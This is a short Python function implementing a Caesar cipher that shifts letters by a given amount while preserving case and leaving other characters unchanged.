def caesar_cipher(text, shift):
    """Apply Caesar cipher to text."""
    result = ""
    for char in text:
        if char.isalpha():
            start = ord("a") if char.islower() else ord("A")
            result += chr((ord(char) - start + shift) % 26 + start)
        else:
            result += char
    return result

